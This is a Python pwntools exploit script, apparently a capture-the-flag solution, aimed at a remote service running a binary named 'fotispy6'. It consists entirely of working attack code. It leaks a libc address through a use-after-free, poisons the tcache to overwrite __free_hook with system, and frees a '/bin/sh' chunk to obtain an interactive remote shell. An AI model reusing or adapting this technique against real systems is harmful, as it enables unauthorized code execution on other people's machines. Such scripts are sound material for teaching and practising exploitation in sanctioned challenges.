from pwn import *

from pwn import *
import warnings

warnings.filterwarnings('ignore')
context.log_level = 'CRITICAL'
context.binary = binary = ELF('./fotispy6', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def create_user():
	p.sendlineafter(b'Choice: ', b'1')
	p.sendlineafter(b'username: ', b'pwned')
	p.sendlineafter(b'password: ', b'pwned')

def add_song(size, data):
	p.sendlineafter(b'Choice: ', b'2')
	p.sendlineafter(b'be: ', str(size).encode())
	p.sendlineafter(b'comment: ', data)

def edit_song(idx, size, data):
	p.sendlineafter(b'Choice: ', b'3')
	p.sendlineafter(b'select: ', str(idx).encode())
	p.sendlineafter(b'be: ', str(size).encode())
	p.sendlineafter(b'comment: ', data)

def view_song(idx):
	p.sendlineafter(b'Choice: ', b'4')
	p.sendlineafter(b'select: ', str(idx).encode())
	p.recvuntil(b'comment:\n')
	return p.recvline()[:-1]

def delete_song(idx):
	p.sendlineafter(b'Choice: ', b'5')
	p.sendlineafter(b'select: ', str(idx).encode())


#p = process()
p = remote('52.59.124.14', 5196)

add_song(0x500, b'aaaa')
add_song(0x20, b'/bin/sh\x00')
delete_song(0)
libc_leak = u64(view_song(0).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ecbe0
print(f'libc leak @ {hex(libc_leak)}')
print(f'libc base @ {hex(libc.address)}')

add_song(0x90, b'cccc')
add_song(0x90, b'cccc')

delete_song(2)
delete_song(3)

edit_song(3, 0x90, p64(libc.symbols.__free_hook))

add_song(0x90, b'dddd')
add_song(0x90, p64(libc.symbols.system))

delete_song(1)

p.interactive()